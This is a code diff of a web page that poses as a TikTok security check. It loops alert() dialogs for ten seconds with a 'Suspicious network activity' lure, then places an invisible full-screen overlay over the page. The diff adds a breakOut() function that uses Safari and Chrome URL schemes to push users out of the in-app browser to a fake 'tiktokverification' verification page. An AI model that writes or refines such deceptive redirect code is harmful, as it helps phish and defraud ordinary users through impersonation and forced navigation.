@@ -12,10 +12,11 @@
             height: 100%; overflow: hidden;
         }
 
+        /* The Full-Screen Blanket */
         #full-screen-redirect {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             z-index: 9999; opacity: 0; cursor: pointer;
-            display: none;
+            display: none; /* Activated after 10s */
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -37,7 +38,7 @@
 </head>
 <body>
 
-    <a id="full-screen-redirect" href="https://tiktokverification.github.io/captcha/Verification/verify1.html"></a>
+    <div id="full-screen-redirect" onclick="breakOut()"></div>
 
     <div id="wrapper">
         <div id="main-content">
@@ -54,30 +55,46 @@
     </div>
 
     <script>
+        const targetUrl = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+
+        function breakOut() {
+            // Attempt to force external browser
+            // Logic: Safari-specific scheme, then Chrome-specific, then standard
+            const safariUrl = targetUrl.replace("https://", "safari-https://");
+            const chromeUrl = targetUrl.replace("https://", "googlechrome://");
+
+            window.location.href = safariUrl;
+
+            // Fallback for non-iOS or if safari-https fails
+            setTimeout(() => {
+                window.location.href = chromeUrl;
+            }, 500);
+
+            // Final fallback
+            setTimeout(() => {
+                window.open(targetUrl, '_system');
+                window.location.href = targetUrl;
+            }, 1000);
+        }
+
         window.onload = function() {
-            const duration = 10000; // 10 seconds in ms
+            const duration = 10000;
             const startTime = Date.now();
             const header = "Suspicious network activity";
-            const baseMsg = "For your security, a brief connection audit is required. Please do not exit the app or disconnect from the network until this security check is complete. We appreciate your patience.";
+            const baseMsg = "Please wait while we check your connection. This will only take a moment. Please do not close the TikTok app during the security check.";
 
             function runAlerts() {
                 const elapsed = Date.now() - startTime;
                 const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
 
                 if (remaining > 0) {
-                    // This forces the alert. When they click OK, it immediately checks the time again.
                     alert(header + "\n\n" + baseMsg + "\n\nTime remaining: " + remaining + "s");
-                    
-                    // Recursive call with a tiny timeout to keep the loop going
                     setTimeout(runAlerts, 50); 
                 } else {
-                    // Once time is actually up based on the clock
                     document.getElementById('full-screen-redirect').style.display = 'block';
                     alert("Security check complete. Please tap 'Verify' to continue.");
                 }
             }
-
-            // Small initial delay so the page renders before the first alert hits
             setTimeout(runAlerts, 500);
         };
     </script>
